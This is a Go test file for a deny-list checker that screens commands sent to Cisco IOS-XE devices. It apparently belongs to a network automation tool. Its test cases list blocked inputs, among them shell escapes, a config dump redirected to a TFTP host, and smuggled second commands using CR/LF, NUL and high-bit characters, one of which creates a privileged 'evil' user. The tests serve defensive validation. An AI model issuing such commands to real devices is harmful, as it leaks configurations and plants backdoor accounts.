package playbook

import (
	"errors"
	"testing"
)

func TestDenyReviewBypasses(t *testing.T) {
	for _, c := range []string{
		"tclsh", "guestshell run bash", "event manager run pol", "archive download-sw tftp://x", "archive config",
		"software install file x", "upgrade rom-monitor", "crypto key generate rsa", "crypto key zeroize", "crypto pki enroll TP",
		"clock set 10:00:00 1 Jan 2026", "monitor capture CAP start", "hw-module switch 1 reset", "redundancy force-switchover",
		"rename flash:a flash:b", "mkdir flash:x", "squeeze flash:", "setup", "boot", "send *", "do show run", "terminal shell",
		"show run | redirect flash:x", "show run | tee flash:x", "show run | append flash:x", "show tech | redirect tftp://1.2.3.4/x",
		"show run | include x | redirect flash:y", "show clock\rconf t", "show clock\nconf t", "show\x00clock", "s run",
	} {
		if err := CheckDenied("ios-xe", c); !errors.Is(err, ErrDenied) {
			t.Errorf("%q not denied", c)
		}
	}
	for _, c := range []string{"show running-config", "sh run", "show logging | include CPU|HOG|MEM", "show run | section interface",
		"show int | exclude down", "show version | begin Switch", "show run | count interface", "dir flash:", "more flash:x.txt",
		"terminal length 0", "terminal width 0", "ping 10.0.0.1", "traceroute 10.0.0.1", "verify flash:x.bin"} {
		if err := CheckDenied("ios-xe", c); err != nil {
			t.Errorf("%q denied: %v", c, err)
		}
	}
}

func TestEphemeralRejectsCR(t *testing.T) {
	if _, err := Ephemeral("ios-xe", "show clock\rconf t\n"); !errors.Is(err, ErrDenied) {
		t.Fatalf("err = %v", err)
	}
}

func TestEphemeralAcceptsCRLF(t *testing.T) {
	p, err := Ephemeral("ios-xe", "show clock\r\nshow version\r\n")
	if err != nil || len(p.Commands) != 2 || p.Commands[0].Text != "show clock" {
		t.Fatalf("%+v %v", p.Commands, err)
	}
}

// IOS con exec-character-bits 7 quita el bit alto: Í (C3 8D) llega como C+CR y Ê (C3 8A) como LF.
func TestDenyNoASCII(t *testing.T) {
	for _, c := range []string{
		"show xÍconf tÍusername evil privilege 15 secret xÍend", "show xÊconf t", "show\tclock", "show clock 😀", "show \u0085clock",
	} {
		if err := CheckDenied("ios-xe", c); !errors.Is(err, ErrDenied) {
			t.Errorf("%q not denied", c)
		}
	}
}

func TestDenySinksTrasElPrimerPipe(t *testing.T) {
	for _, c := range []string{"sh run | i x | r flash:x", "sh run | i x | t flash:x", "sh run | i x | a flash:x", "sh run | i x | re flash:x"} {
		if err := CheckDenied("ios-xe", c); !errors.Is(err, ErrDenied) {
			t.Errorf("%q not denied", c)
		}
	}
	if err := CheckDenied("ios-xe", "sh run | i x"); err != nil {
		t.Errorf("denied: %v", err)
	}
}
